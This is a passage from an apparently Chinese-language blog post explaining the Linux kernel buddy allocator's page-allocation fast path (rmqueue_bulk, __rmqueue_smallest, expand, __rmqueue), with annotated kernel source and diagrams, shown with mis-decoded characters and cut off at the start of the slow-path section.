è¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ä» per-cpu é“¾è¡¨ä¸Šå–å‡º page, è°ƒç”¨è€…å¿…é¡»ä¿æŠ¤é“¾è¡¨ */</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_pcplist</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (list_empty(<span class="built_in">list</span>)) &#123; <span class="comment">// list æ˜¯ç©ºçš„</span></span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">pcp-&gt;count += rmqueue_bulk(zone, <span class="number">0</span>,</span><br><span class="line">READ_ONCE(pcp-&gt;batch), <span class="built_in">list</span>,</span><br><span class="line">migratetype, alloc_flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(list_empty(<span class="built_in">list</span>)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é“¾è¡¨è„±é“¾</span></span><br><span class="line">page = list_first_entry(<span class="built_in">list</span>, <span class="keyword">struct</span> page, lru);</span><br><span class="line">list_del(&amp;page-&gt;lru);</span><br><span class="line">pcp-&gt;count--;</span><br><span class="line">&#125; <span class="keyword">while</span> (check_new_pcp(page));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>rmqueue_bulk()</code> åˆ™æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>__rmqueue()</code> ä¸º pcplist è¿›è¡Œ <code>pcp-&gt;batch</code> æ¬¡çš„ order-0 çš„é¡µé¢åˆ†é…ï¼Œå¹¶å»ºç«‹é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä¸ºäº†é«˜æ•ˆç‡ï¼Œä» buddy åˆ†é…å™¨è·å¾—æŒ‡å®šæ•°é‡çš„å…ƒç´ , </span></span><br><span class="line"><span class="comment"> * æ‰€æœ‰çš„å•ä¸ªå…ƒç´ éƒ½åœ¨æŒæœ‰é”çš„æƒ…å†µä¸‹è¿›è¡Œ.  å°†å…¶æ·»åŠ åˆ°æä¾›çš„é“¾è¡¨ä¸­.</span></span><br><span class="line"><span class="comment"> * è¿”å›æ”¾ç½®åœ¨ *list é“¾è¡¨ä¸Šçš„ pages æ•°é‡.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">rmqueue_bulk</span><span class="params">(<span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> count, <span class="keyword">struct</span> list_head *<span class="built_in">list</span>,</span></span><br><span class="line"><span class="params"><span class="type">int</span> migratetype, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i, alloced = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;zone-&gt;lock);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> __rmqueue(zone, order, migratetype,</span><br><span class="line">alloc_flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(page == <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(check_pcp_refill(page)))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ç”± expand() è¿”å›çš„åˆ†å‰² buddy é¡µé¢åœ¨æ­¤å¤„ä»¥ç‰©ç†é¡µæ¡†é¡ºåºæ¥æ”¶ã€‚</span></span><br><span class="line"><span class="comment"> * é¡µé¢è¢«æ·»åŠ åˆ° caller çš„é“¾è¡¨å°¾éƒ¨ã€‚ä» caller çš„è§’åº¦çœ‹ï¼Œé“¾è¡¨åœ¨</span></span><br><span class="line"><span class="comment"> * æŸäº›æƒ…å†µä¸‹æ˜¯æŒ‰ç…§é¡µç æ’åºçš„ã€‚è¿™å¯¹ä¸€äº›å¯ä»¥ä»å¤´éƒ¨å‰å‘çš„IOè®¾å¤‡æ˜¯æœ‰ç”¨çš„ï¼Œ</span></span><br><span class="line"><span class="comment"> * å› ä¸ºé“¾è¡¨ä¹Ÿæ˜¯åœ¨ç‰©ç†é¡µçš„é¡ºåºä¸Šçš„ã€‚è¿™å¯¹äºå¯ä»¥åœ¨ç‰©ç†é¡µåˆç†æ’åºçš„æƒ…å†µä¸‹</span></span><br><span class="line"><span class="comment"> * åˆå¹¶IOè¯·æ±‚çš„IOè®¾å¤‡æ˜¯æœ‰ç”¨çš„ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_add_tail(&amp;page-&gt;lru, <span class="built_in">list</span>);</span><br><span class="line">alloced++;</span><br><span class="line"><span class="keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))</span><br><span class="line">__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,</span><br><span class="line">      -(<span class="number">1</span> &lt;&lt; order));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * i pages were removed from the buddy list even if some leak due</span></span><br><span class="line"><span class="comment"> * to check_pcp_refill failing so adjust NR_FREE_PAGES based</span></span><br><span class="line"><span class="comment"> * on i. Do not confuse with &#x27;alloced&#x27; which is the number of</span></span><br><span class="line"><span class="comment"> * pages added to the pcp list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));</span><br><span class="line">spin_unlock(&amp;zone-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> alloced;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="â‘¡-rmqueue-smallest-ï¼šéå†æŒ‡å®š-migrationtype-é“¾è¡¨çš„-buddy-ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰"><a href="#â‘¡-rmqueue-smallest-ï¼šéå†æŒ‡å®š-migrationtype-é“¾è¡¨çš„-buddy-ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰" class="headerlink" title="â‘¡ __rmqueue_smallest()ï¼šéå†æŒ‡å®š migrationtype é“¾è¡¨çš„ buddy ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰"></a>â‘¡ __rmqueue_smallest()ï¼šéå†æŒ‡å®š migrationtype é“¾è¡¨çš„ buddy ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰</h5><p>æˆ‘ä»¬é‡æ–°æ¥å›é¡¾ä¸€ä¸‹ <code>free_area</code> çš„ç»“æ„ï¼Œåœ¨å…¶ä¸­æ ¹æ®è¿ç§»ç±»å‹åˆ†æˆäº†å¤šä¸ªé“¾è¡¨ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>è€Œä¸€ä¸ª zone æ˜¯ç”±å¤šä¸ª <code>free_area</code> ç»„æˆçš„ï¼Œä¸€ä¸ª <code>free_area</code> å¯¹åº”ä¸€ä¸ª orderï¼Œé‚£ä¹ˆå¯¹äºè¯¥å‡½æ•°è€Œè¨€å…¶åªä¼šéå†ç‰¹å®šçš„ orderï¼Œé‚£ä¹ˆå°±æˆäº†ä¸‹é¢çš„æ¨¡å‹ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ä»¥æ¥çœ‹è¿™ä¸ªå‡½æ•°äº†ï¼šä»å¾…åˆ†é… order æ‰€å¯¹åº”çš„ <code>free_area</code> çš„æŒ‡å®šçš„ migration type é“¾è¡¨ä¸Šåˆ†é…ï¼Œè‹¥ä¸å¤Ÿåˆ™ä¸€ç›´å‘æ›´é«˜ order è¿›è¡Œåˆ†é…åå¯¹åŠå‘ä¸‹æ‹†åˆ°ä½ orderï¼Œè¿™é‡Œå‘æ›´é«˜ order åˆ†é…æ˜¯é€šè¿‡ç®€å•çš„å¾ªç¯ + é“¾è¡¨è„±é“¾æ“ä½œå®Œæˆçš„ï¼Œè€Œæ‹†é«˜é˜¶ page çš„æ“ä½œåˆ™æ˜¯é€šè¿‡ <code>expand()</code> å®Œæˆçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * å¯¹ç»™å®šçš„ migrationtype éå† free lists </span></span><br><span class="line"><span class="comment"> * å¹¶ä» freelists ä¸Šç§»é™¤æœ€å°å¯ç”¨çš„é¡µé¢</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> __always_inline</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_smallest</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">migratetype</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> current_order;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> *<span class="title">area</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* åœ¨ preferred list ä¸Šå¯»æ‰¾ä¸€ä¸ªåˆé€‚ size çš„ page */</span></span><br><span class="line"><span class="keyword">for</span> (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;</span><br><span class="line">area = &amp;(zone-&gt;free_area[current_order]);</span><br><span class="line">page = get_page_from_free_area(area, migratetype);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">del_page_from_free_list(page, zone, current_order);</span><br><span class="line">expand(zone, page, order, current_order, migratetype);</span><br><span class="line">set_pcppage_migratetype(page, migratetype);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>expand()</code> çš„é€»è¾‘å°±æ¯”è¾ƒç®€å•ï¼Œä»é«˜é˜¶ order ä¸€ç›´å¾ªç¯åˆ°å¾…åˆ†é…çš„ orderï¼š</p><ul><li>é¦–å…ˆé«˜é˜¶ orderâ€“ï¼Œä¹‹åé¡µé¢æ‹†ä¸¤åŠï¼ŒæŠŠååŠéƒ¨åˆ†æŒ‚åˆ°é“¾è¡¨ä¸Šï¼Œå‰åŠéƒ¨åˆ†ç•™åˆ°ä¸‹æ¬¡å¾ªç¯ç»§ç»­æ‹†</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ­¤å¤„å†åˆ†å‰²çš„é¡ºåºå¯¹ IO subsystem è€Œè¨€æ˜¯ååˆ†é‡è¦çš„.</span></span><br><span class="line"><span class="comment"> * è¯·ä¸è¦åœ¨æœ‰å¥½çš„ç†ç”±åŠå›å½’æµ‹è¯•å‰æ”¹å˜è¿™ä¸ªé¡ºåºã€‚</span></span><br><span class="line"><span class="comment"> * ç‰¹åˆ«åœ°ï¼Œå½“å¤§å—çš„å†…å­˜è¢«åˆ†å‰²ï¼Œæ›´å°å—ï¼ˆå†…å­˜ï¼‰è¢«ä¼ é€’çš„é¡ºåº</span></span><br><span class="line"><span class="comment"> * åˆ™ç”±ä»–ä»¬åœ¨è¯¥å‡½æ•°ä¸­è¢«åˆ†å‰²çš„é¡ºåºå†³å®šã€‚</span></span><br><span class="line"><span class="comment"> * æ ¹æ®å®é™…æµ‹è¯•ï¼Œè¿™æ˜¯å½±å“ä¼ é€’ç»™IOå­ç³»ç»Ÿçš„ pages é¡ºåºçš„ä¸»è¦å› ç´ ï¼Œ</span></span><br><span class="line"><span class="comment"> * è€ƒè™‘åˆ°åŒ…å«ä¸€ä¸ªå†…å­˜å¤§å—ï¼ˆç”±ä¸€ç³»åˆ—å°çš„åˆ†é…ä½œç”¨ï¼‰çš„ buddy system çš„è¡Œä¸ºï¼Œ</span></span><br><span class="line"><span class="comment"> * è¿™ä¹Ÿæ˜¯åˆç†çš„ã€‚è¿™ç§è¡Œä¸ºæ˜¯ sglist åˆå¹¶æˆåŠŸçš„å…³é”®å› ç´ ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- nyc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">expand</span><span class="params">(<span class="keyword">struct</span> zone *zone, <span class="keyword">struct</span> page *page,</span></span><br><span class="line"><span class="params"><span class="type">int</span> low, <span class="type">int</span> high, <span class="type">int</span> migratetype)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> size = <span class="number">1</span> &lt;&lt; high;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (high &gt; low) &#123;</span><br><span class="line">high--;</span><br><span class="line">size &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ ‡è®°ä¸º guard pages (æˆ– page), è¿™å°†å…è®¸åœ¨ buddy å°†è¢«</span></span><br><span class="line"><span class="comment"> * é‡Šæ”¾æ—¶åˆå¹¶å›åˆ†é…å™¨.å¯¹åº”çš„é¡µè¡¨é¡¹ä¸ä¼šè¢«åˆ›å»ºï¼Œ</span></span><br><span class="line"><span class="comment"> * pages åœ¨ è™šæ‹Ÿåœ°å€ç©ºé—´ä¸Šä»å°†ä¿æŒä¸å­˜åœ¨ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">add_to_free_list(&amp;page[size], zone, high, migratetype);</span><br><span class="line">set_buddy_order(&amp;page[size], high);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="â‘¢-rmqueue-ï¼šåˆ†é…å°è£…å‡½æ•°"><a href="#â‘¢-rmqueue-ï¼šåˆ†é…å°è£…å‡½æ•°" class="headerlink" title="â‘¢ __rmqueue()ï¼šåˆ†é…å°è£…å‡½æ•°"></a>â‘¢ __rmqueue()ï¼šåˆ†é…å°è£…å‡½æ•°</h5><p>è¿™ä¸ªå‡½æ•°å…¶å®ä¸»è¦æ˜¯å¯¹å…¶ä»–åˆ†é…å‡½æ•°çš„å°è£…ï¼Œæœ€ç»ˆçš„æ ¸å¿ƒå‡½æ•°å…¶å®éƒ½è¿˜æ˜¯ <code>__rmqueue_smallest()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä» buddy allocator ä¸Šç§»é™¤ä¸€ä¸ªå…ƒç´ .</span></span><br><span class="line"><span class="comment"> * åœ¨æŒæœ‰ zone-&gt;lock æ—¶è°ƒç”¨.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">rmqueue</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * é€šè¿‡å½“åŠæ•°ç©ºé—²å†…å­˜åœ¨ CMA åŒºåŸŸæ—¶ä» CMA ä¸­åˆ†é…</span></span><br><span class="line"><span class="comment"> * ä»¥å¹³è¡¡å¸¸è§„çš„ä¸CMAåŒºåŸŸçš„å¯è¿ç§»çš„åˆ†é…ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;</span><br><span class="line">    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;</span><br><span class="line">    zone_page_state(zone, NR_FREE_PAGES) / <span class="number">2</span>) &#123;</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">page = __rmqueue_smallest(zone, order, migratetype);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA)</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,</span><br><span class="line">alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line">trace_mm_page_alloc_zone_locked(page, order, migratetype);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è‹¥å¼€å¯äº† CMAï¼Œæ¯”å¯¹å¸¸è§„åŒºåŸŸä¸ CMA åŒºåŸŸçš„ç©ºé—²é¡µé¢æ•°é‡ï¼Œè‹¥ CMA çš„å¤šåˆ™è°ƒç”¨ <code>__rmqueue_cma_fallback()</code> ä» CMA åŒºåŸŸåˆ†é…ï¼ˆå…¶å®å°±æ˜¯è°ƒç”¨ <code>__rmqueue_smallest()</code> ä»è¿ç§»ç±»å‹ä¸º <code>MIGRATE_CMA</code> çš„é“¾è¡¨ä¸Šåˆ†é…ï¼‰ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>__rmqueue_smallest()</code> ä»æŒ‡å®šè¿ç§»ç±»å‹é“¾è¡¨è¿›è¡Œåˆ†é…ï¼Œè‹¥æœªæˆåŠŸï¼š<ul><li>è‹¥è®¾ç½®äº† <code>ALLOC_CMA</code> çš„åˆ†é… flagï¼Œè°ƒç”¨ <code>__rmqueue_cma_fallback()</code> ä» CMA åŒºåŸŸè¿›è¡Œåˆ†é…</li><li>è‹¥ä¸Šä¸€æ­¥å¤±è´¥åˆ™è°ƒç”¨ <code>__rmqueue_fallback()</code> å°è¯•ä»å…¶ä»–è¿ç§»ç±»å‹é“¾è¡¨è·å–é¡µé¢ï¼Œè‹¥è¿˜æ˜¯å¤±è´¥åˆ™é‡è¯•è¿™ä¸€ä¸ªå¤§æ­¥éª¤</li></ul></li></ul><h3 id="III-alloc-pages-slowpath-ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„"><a href="#III-alloc-pages-slowpath-ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„" class="headerlink" title="III. __alloc_pages_slowpath()ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„"></a>III. __alloc_pages_slowpath()ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„</h3><p>å½“å¿«é€Ÿè·¯å¾„çš„åˆ†é…ä¸æˆåŠŸæ—¶ï¼Œè¯´æ˜ç³»ç»Ÿå½“å‰å¯èƒ½å·²ç»æ²¡æœ‰è¶³å¤Ÿçš„è¿ç»­çš„ç©ºé—²é¡µé¢ï¼Œè¿™æ—¶æˆ‘ä»¬å°±è¦è¿›å…¥åˆ°æ…¢é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œ<strong>è¿›è¡Œå†…å­˜ç¢ç‰‡æ•´ç†ä¸å†…å­˜å›æ”¶</strong>ï¼Œä¹‹åå†è¿›è¡Œåˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span 